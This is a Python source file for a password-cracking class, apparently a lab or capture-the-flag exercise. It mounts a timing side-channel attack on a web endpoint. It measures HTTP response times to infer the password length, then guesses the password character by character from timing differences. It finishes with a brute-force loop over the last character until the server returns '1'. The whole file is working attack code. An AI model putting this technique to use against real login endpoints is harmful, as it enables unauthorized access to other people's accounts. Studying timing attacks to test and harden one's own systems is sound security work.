from Icracker import Cracker
import requests




# check 'repeat' times the duration for request/response to spcific url (url2check)
# return array with measured duration of requestqresponse to url
# find the password length
# logic: search for average highest duration
# assumption: duration for the correct length is higher than for length for incorrect length

class ZvikaCracker(Cracker):
    file = open("cracker_log.txt","w")  

    def find_pass_len(self,password_start_len=1):
        self.analize(password_start_len)        
        idx = self.checks.index(max(self.checks))
            
        print(f"Password length found: {idx -1}")
        return idx -1


    def find_password(self,length):
        password = ""
        is_max = True
        for j in range(length-1):
            print(j)
            #count = 0
            checks = []
            self.file.write('----------------start----------------\n\n')
            for i in range(len(self.POOL)):
                url1 = self.url + '/' + (password + self.POOL[i]+"_"*(length-j-1))
                print(f'checking for: {url1}')

                checks.append(min(self.timeit(url1, 3)))

                print(f'time {checks[-1]}')
                self.file.write(f'checking for: {url1}\n')
                self.file.write(f'time {checks[-1]}\n')
            if is_max:
                password += self.POOL[checks.index(max(checks))]
            else:
                password += self.POOL[checks.index(min(checks))]
            print(password)
            if j%2 != 0:
                is_max = not is_max
            print("index - " + str(j))
            print("is_max - " + str(is_max))

        
        self.file.write('----------------end----------------\n\n')
            
        return password


    def find_pass_last_char(self,password):
        for i in self.POOL:
            url1 = self.url + '/' + (password+i)
            print(f'checking for: {str(password+i)}')
            r = requests.get(url1, allow_redirects=True)
            if r.content == b'1':
                print(f'password found: {str(password+i)}')
                return [str(password+i),True]
        return ["",False]
                